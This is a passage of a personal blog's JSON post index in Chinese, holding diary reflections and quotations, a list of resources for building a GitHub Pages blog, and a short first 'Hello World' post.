20160907-20161016，四十天。结束了很多，开始的也很多。遗憾的是其间诸多瞬间感受没有来得及记录下来。发现无论走到哪里，新结识的人很多都可以在某方面与之前的身边的人产生一一对应的关系，比如杰含、东浩、科鹏、雯静、娴梦……除此之外，还有便是以往的瞬间场景经常会与现在的瞬间场景出现惊人的一致性，而每到这个时候，总会不自主的颤抖几下。我想说的，还有，明天的我，明天的我们将会变成什么模样。对了，明天星期一。 既然睡的比较晚，那就晚点睡吧。真的不知道自己一天都干了些什么。微笑不出来。加强时间分配利用能力。睡喽，明天继续微笑。 浮现。管家。佛性童心。纯粹。朴。羽烬。自我与本我。光影低雕灯。冷暖。life&amp;light。书独慰藉。果然(燃)美。缬美。目送。chris。红格调。 我知道每天早起后我会忘记从床上拿下来眼镜、我知道我的眼镜会坏的、我知道 《周鸿祎自述》他们选择和拒绝一款产品，往往来源于人性很小的点。 ——周鸿祎 渐发现，熬夜其实很困，只是心中一直有所期待，有所牵挂的东西，它迟迟让你感觉下一秒可能就会有所惊喜，也许是你孤独惯了，幸福的人是从来不晚睡的。——季箐 每个人年轻的时候，都想离开自己的父母，离的越远越好，不知不觉真就走出很远，与他们相隔千山万水，有一天猛一回头你会发现，无论走多远，总有一根线连着你和他们，那时候父母已经变老，腿脚不再利索，于是你又折回头重回他们身边，和以前不一样的是，你变成了大人，他们变成了孩子。 ​​​​ Notebook that makes your wish come true with fairy magic. 最容易实现的目标是最成功的目标。 想听音乐，闭上眼睛，轻轻地把音响放到左耳边，感觉音量小了点，于是我把音量增加了一点点。再次闭上眼睛，感觉音量又大了一点。我尝试把音量再减一点，结果是感觉音量又小了点。 有些时候，我会循环这样的无聊的动作，然而大部分的时候我是无奈的。 真的想把白天的时间利用起来，晚上该睡就睡。以后每天我要尽量不在宿舍待。除了晚上睡觉回宿舍，其他时间尽量去实验室学点技术。 走过小径，枝叶还能摇摆、；走过楼道，电灯还能变亮；走进窄门，管缝还能喷水；站在那里，影子还能出现。原来，你依然是你，再怎么堕落你依然是你。请善待自己。 现在你拥有的很多东西，甚至是你不想要的，正是其他人想尽各种办法想得到的。这些东西随时都可能丢失，你要学会珍惜你所拥有的。 这个世界上哪里有什么岁月静好，只不过有人替你负重前行。 四年很长，它可以像青春那样长；四年也很短，它也可以像南北苑的距离一样短。 很奇怪，听着一个陌生人的歌，一遍又一遍的循环。我不喜欢晚睡，但我总是不自觉的想晚睡。 大家晚安","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]},{"title":"搭建博客后的资源整合","slug":"搭建博客后的资源整合","date":"2017-07-08T05:14:29.000Z","updated":"2018-08-04T11:01:30.081Z","comments":true,"path":"2017/07/08/搭建博客后的资源整合/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/08/搭建博客后的资源整合/","excerpt":"对于我这样的小白，从开始搭建博客到搭建好，到配置博客的小功能，，再到基本熟悉用Markdown语法写文章并熟悉上传文章的命令，差不多用了三四天的时间。下面就简单整合一下此过程中接触到的一些较为有用的资源。。。","text":"对于我这样的小白，从开始搭建博客到搭建好，到配置博客的小功能，，再到基本熟悉用Markdown语法写文章并熟悉上传文章的命令，差不多用了三四天的时间。下面就简单整合一下此过程中接触到的一些较为有用的资源。。。 如果你想自己动手用GitHub搭建一个属于自己的博客，不妨先去了解一下什么是GitHub,为什么不直接去其他博客平台上注册一个账号，多省事。等你了解完之后，再动手不迟。 首先推荐一个搭建教程[http://www.jianshu.com/p/863f3f2d1733]我就是按他这个教程一步步来的，讲的比较详细。 其中在输入第一条命令时，他讲的不算特别清楚，没有说明是在哪个命令框内输入 这个命令可以去运行命令框中执行。然后继续跟着他的步骤来，后面在设置SSH的时候，需要从Vim编辑器中提取一大串字符，这时候你如果还用Ctrl+C的话会发现复制不下来，这时候你需要使用Vim认可的复制快捷键，这时候你就可以去搜索一下了。其他的都会比较顺利，最后出现博客的基本模型。（其中你可能会遇到一个或两个404错误页面，第一个可能是你在设置GitHub用户名和域名不一样，第二个404需要去仓库中操作一下CNAME，具体怎么搞，这里不再详细解释，可以网上搜索一下，实在搞不清可以邮件联系我。基本模型搭建好以后就该设置它的小功能了。你可能会需要以下工具：功能强大的文本编辑器：Notepad++在线制作网址图标(ico):[http://www.bitbug.net/]小功能设置教程(注意主题的不同）：[http://moxfive.coding.me/yelee/]编辑.md文件的MarkDown下载，win10的下载好之后不能直接用，还需要下载一个软件：awesomium才能使用。同时可以搜一个在线MarkDown编辑器使用。 awesomium下载 密码：ipgp 最后的最后附上主题设计者的博客[http://litten.me/]供大家参考学习。搭建好自己的博客之后，就需要我们坚持写博客喽。 ……………………………………………………………………………………………………………………………..在写博客的过程中，你可能会想怎么写出其他颜色的字体呢？别急，请看下面的链接…CSDN-markdown编辑器语法——字体、字号与颜色 http://blog.csdn.net/testcs_dn/article/details/45719357","categories":[],"tags":[{"name":"其他","slug":"其他","permalink":"http://leo.dropsec.xyz/tags/其他/"}]},{"title":"Hello Word","slug":"Hello-Word","date":"2017-07-04T13:53:56.000Z","updated":"2018-07-30T12:50:03.422Z","comments":true,"path":"2017/07/04/Hello-Word/","link":"","permalink":"http://leo.dropsec.xyz/2017/07/04/Hello-Word/","excerpt":"在实验室鹏哥和某些学长的推荐和帮助下，这个博客终于搭建起来了。","text":"在实验室鹏哥和某些学长的推荐和帮助下，这个博客终于搭建起来了。折腾了两天多，在github page上看到自己的博客加载下来时，突然有种错综复杂的恍惚感。是的，它不是qq空间，不是新浪博客，不是豆瓣小站，也不是贴吧。它更像是属于自己的一块小小的领地，因而我满足于这种归属感。我愿在上面安静劳作。 一个农民，通过自身努力终于分到了一块地，不再需要在地主的土地上创造流量价值时，于是翻身作主的他可以宣告说：Hello World。当然这个农民确切来说是个小小的码农。 感谢在搭建过程中给予我帮助的友人们（感谢Litten）。","categories":[],"tags":[{"name":"洋流","slug":"洋流","permalink":"http://leo.dropsec.xyz/tags/洋流/"}]}]}